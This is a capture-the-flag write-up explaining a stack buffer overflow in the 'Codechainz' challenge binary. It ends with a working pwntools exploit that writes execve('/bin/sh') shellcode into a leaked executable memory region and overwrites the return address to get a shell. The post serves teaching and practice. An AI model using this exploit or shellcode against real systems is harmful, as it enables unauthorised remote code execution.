---
title: Codechainz
author: Patrick
ShowToc: true
date: 2022-04-18
---

> This is Codechain's older brother, Codechainz

### What's going on?

This is what we get if we run the program:

```
Hey, this is an epic memory saver. #saved
Because of COVID-19 restrictions,
we can only do memory saving of programming languages.
We apologize for the inconvenience.

Preparing the memory space...
Memory space is ready for storing data.
DISCLAIMER: All your memories will be saved at 0x7fd43dc5f000.


Here are your options. Choose one:
1  Make a new memory
2  View a memory
3  Delete a memory
4  Exit
>
```
Apparently it leaks an address and allows us to make, view and delete a memory (which should be saved at the aforementioned address).

A quick checksec tells us that there's no canary but the stack isn't executable:
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```

Thanks to the binary not being stripped, the code (decompiled using Ghidra) is quite readable.
The main just sets an alarm (which isn't handled so the program crashes after 20 seconds) and calls two functions.
```c
int main(void) {
  alarm(20);
  welcome();
  loop_de_loop();
  return 0;
}
```

The first one, `welcome`, does nothing useful except calling `initMemory` (which allocates `0x1E=30` bytes with the `PROT_EXEC` bit set) and printing `memory_space`'s address.
```C
void init_memory(void) {
  int *piVar1;
  memory_space = mmap(0x0,0x1e,0x7,0x22,-1,0);
  if (memory_space == -1) {
    perror("mmap");
    fflush(stdout);
    piVar1 = __errno_location();
                    /* WARNING: Subroutine does not return */
    exit(*piVar1);
  }
  return;
}
```

The second one, `loop_the_loop`, is just a REPL interface. The interesting bit is `input_str`, called when making a new memory.

Here 44 bytes are allocated on the stack for our input but 100 are read (thus allowing us to _smash the stack_:tm:). Then the first 30 bytes are copied to `memory_space` (which we know is executable).
```c
void input_str(void) {
  char stack_buffer [44];
  int i;
  
  memset(stack_buffer,0,30);
  puts("Please input a programming language of your desire. I swear i will remember it.");
  printf("> ");
  fflush(stdout);
  fgets(stack_buffer,100,stdin);
  for (i = 0; i < 30; i = i + 1) {
    *(char *)(memory_space + i) = stack_buffer[i];
  }
  fflush(stdin);
  return;
}
```

### The solution

By looking at the disassembled `input_str` we see that `0x30` bytes are reserved on the stack and `stack_buffer` is placed at it's beginning:
```
0000000000001389 <input_str>:
    1389:	55                   	push   %rbp
    138a:	48 89 e5             	mov    %rsp,%rbp
    138d:	48 83 ec 30          	sub    $0x30,%rsp       <-
    1391:	48 8d 45 d0          	lea    -0x30(%rbp),%rax <-
    .....
```
So this is how the stack looks:
```
+--------+ 0
|        |
|        | --> variables allocated on the stack
|        |
+--------+ 0x30 = 48
|        | --> parent's RBP
+--------+ 56
|        | --> return address
+--------+ 64
```

We just have to place a shellcode in the first 30 bytes and then write `memory_space` address on top of the regular return address

```python
from pwn import *

io = connect('51.124.222.205', 13370)

'''
Linux/x86_64 execve("/bin/sh"); 30 bytes shellcode

http://shell-storm.org/shellcode/files/shellcode-603.php
'''
shellcode = b"\x48\x31\xd2"                             +  \
            b"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68" +  \
            b"\x48\xc1\xeb\x08"                         +  \
            b"\x53"                                     +  \
            b"\x48\x89\xe7"                             +  \
            b"\x50"                                     +  \
            b"\x57"                                     +  \
            b"\x48\x89\xe6"                             +  \
            b"\xb0\x3b"                                 +  \
            b"\x0f\x05"

io.recvuntil(b'saved at ')
addr = int(io.recvuntil(b'.', drop=True).decode(), 16)
log.info(f'memory_space address: {hex(addr)}')

io.recvuntil(b'> ')
io.sendline(b'1')
io.recvuntil(b'> ')

payload = shellcode  # shellcode (30 bytes long)
payload += b'K'*26   # padding
payload += p64(addr) # memory_space address

io.sendline(payload)
io.interactive()
```

We now have a shell on the server so we can `cat flag.txt`